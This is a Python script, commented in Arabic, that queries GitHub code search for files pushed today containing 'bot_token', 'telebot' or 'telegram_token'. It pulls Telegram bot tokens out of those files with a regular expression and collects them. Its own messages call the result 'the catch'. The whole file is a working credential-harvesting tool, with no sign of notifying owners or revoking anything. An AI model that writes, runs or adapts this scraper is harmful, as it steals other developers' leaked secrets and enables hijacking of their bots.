import re
import os
import datetime
from github import Github, GithubException

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        print("[!] GITHUB_TOKEN غير موجود!")
        return []
        
    print("[*] بدء عملية مسح جديدة على GitHub...")
    try:
        g = Github(token, timeout=10) # تقليل وقت الانتظار لزيادة السرعة
    except Exception as e:
        print(f"[!] خطأ في الاتصال: {e}")
        return []

    found_tokens = []
    # البحث في آخر 24 ساعة
    today = datetime.datetime.utcnow().strftime('%Y-%m-%d')
    
    # تحسين الاستعلامات للسرعة
    queries = [
        f'bot_token pushed:>{today}',
        f'telebot pushed:>{today}',
        f'telegram_token pushed:>{today}'
    ]
    
    for query in queries:
        print(f"[>] جاري فحص: {query}")
        try:
            # البحث مباشرة
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            # معالجة النتائج مباشرة بدون تحويل كامل لـ List لتوفير الذاكرة والوقت
            count = 0
            for file in results[:30]: # أول 30 نتيجة هي الأكثر أهمية
                try:
                    content = file.decoded_content.decode('utf-8')
                    # استخدام ريجكس سريع ومباشر
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                            count += 1
                except: continue
            
            print(f"[+] تم استخراج {count} توكن جديد من هذا الاستعلام.")
            
        except GithubException as e:
            # إذا تجاوزنا حد الطلبات، ننتظر قليلاً ثم نكمل
            if e.status == 403:
                print("[!] تم الوصول لحد الطلبات (Rate Limit). انتظار 60 ثانية...")
                time.sleep(60)
            else:
                print(f"[!] خطأ في الاستعلام: {e}")
        except Exception as e:
            print(f"[!] خطأ غير متوقع: {e}")
            
    print(f"[*] تمت العملية. إجمالي الصيد الحالي: {len(found_tokens)}")
    return found_tokens
